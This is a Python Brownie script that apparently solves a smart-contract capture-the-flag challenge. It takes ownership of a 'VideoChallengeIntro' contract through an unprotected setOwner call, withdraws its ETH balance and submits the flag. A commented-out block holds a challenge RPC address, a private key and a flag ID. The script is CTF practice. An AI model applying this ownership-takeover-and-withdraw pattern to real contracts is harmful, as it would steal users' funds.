#!/usr/bin/python3
from brownie import web3, VideoChallengeIntro, Setup, network
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from scripts.get_data import get_values
from scripts.submit import submit
from colorama import Fore
from subprocess import run


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{solved}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(netwrk=False):
    # print(network)
    if netwrk != "mevsec":
        setup, _ = deploy()
        _, attacker = get_account()
    else:
        RPC_URL, SETUP, PRIVATE_KEY, FLAG_ID = get_values()

        # RPC_URL, SETUP, PRIVATE_KEY, FLAG_ID = (
        #     "http://ctf.mevsec.com:50445",
        #     "0x876807312079af775c49c916856A2D65f904e612",
        #     0xEDBC6D1A8360D0C02D4063CDD0A23B55C469C90D3CFBC2C88A015F9DD92D22B3,
        #     "f25b4b38222c1cd5b578853b986b5c94e4cd5a23930dca11e8e446c6b0c0b71d",
        # )

        try:
            run(
                [
                    "brownie",
                    "networks",
                    "modify",
                    "mevsec",
                    f"host={RPC_URL}",
                ],
                check=True,
            )
        except:
            print("OPPS!!")
            exit(-1)

        # print(Setup)
        # print(type(Setup))
        # exit()
        setup = Setup.at(f"{SETUP}")
        attacker = get_account()

    print_colour(setup.isSolved())

    # ? get the address of the target contract
    vci_contract = VideoChallengeIntro.at(setup.vci.call())
    # print(target.vci.call())

    print(
        f"{magenta}Contract balance: {green}{web3.fromWei(vci_contract.balance({'from': attacker}), 'ether')} ETH{reset}"
    )
    # print(dir(vci_contract))

    vci_contract.setOwner({"from": attacker, "gas_limit": 200000}).wait(1)
    vci_contract.withdraw({"from": attacker, "gas_limit": 200000}).wait(1)

    print(
        f"{magenta}Contract balance: {green}{web3.fromWei(vci_contract.balance({'from': attacker}), 'ether')} ETH{reset}"
    )
    print_colour(setup.isSolved())

    assert setup.isSolved() == True

    if netwrk == "mevsec":
        # now sublit & get the points
        submit(FLAG_ID)


def main():
    netwrk = network.show_active()
    # print(netwrk)

    if netwrk == "mevsec":
        hack(netwrk)
    else:
        hack()


if __name__ == "__main__":
    main()
